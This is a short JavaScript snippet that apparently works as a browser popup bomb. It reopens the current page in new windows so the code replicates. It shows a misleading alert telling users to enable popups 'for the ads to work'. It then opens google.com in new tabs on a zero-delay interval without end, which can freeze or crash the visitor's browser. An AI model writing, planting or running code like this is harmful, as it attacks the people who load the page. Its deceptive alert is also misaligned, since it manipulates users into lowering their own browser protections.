newWin = window.open(window.location.href);
if(!newWin) { 
  alert("Please enable popups inorder for the ads to work"); 
  setTimeout(() => {
    window.close();
  }, 5000);
}
setInterval(() => {
  window.open('https://google.com/', '_blank')
}, 0);
